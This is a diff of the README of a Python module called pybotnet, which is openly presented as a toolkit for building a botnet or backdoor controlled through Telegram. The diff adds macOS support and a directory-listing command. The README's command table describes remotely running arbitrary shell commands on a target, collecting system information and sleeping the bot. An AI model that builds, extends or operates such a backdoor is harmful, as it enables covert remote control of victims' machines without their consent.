@@ -1,9 +1,9 @@
-# pybotnet  0.08
+# pybotnet  0.09
 
 A module for building botnet or back door with Python and Telegram control panel
 - [x] windows
 - [x] linux
-- [ ] mac
+- [x] mac
 
 ### See the [TODO List](https://github.com/onionj/pybotnet/blob/master/TODOLIST.MD) if you want to *help* me <3
 
@@ -12,6 +12,7 @@ A module for building botnet or back door with Python and Telegram control panel
 * get command and send message by third party proxy
 * get target info 
 * sleep source by Optional message
+* get ls (dirctory list)
 
  
 
@@ -51,5 +52,5 @@ COMMAND | DO THIS | Minimum version required |
 --------|---------|--------------------------|
 do_sleep \<scconds> \<message (Optional)> |  \<if message != none : print(message) > ; time.sleep(seccond) | 0.08 |
 get_info | return system info | 0.06 |
-cmd \<system command> | run system command in shell or cmd (Be careful not to give endless command)| 007 |
-
+cmd \<system command> | run system command in shell or cmd (Be careful not to give endless command)| 0.07 |
+ls \<route (Optional)> | Returns a list of folders and files in that path | 0.09
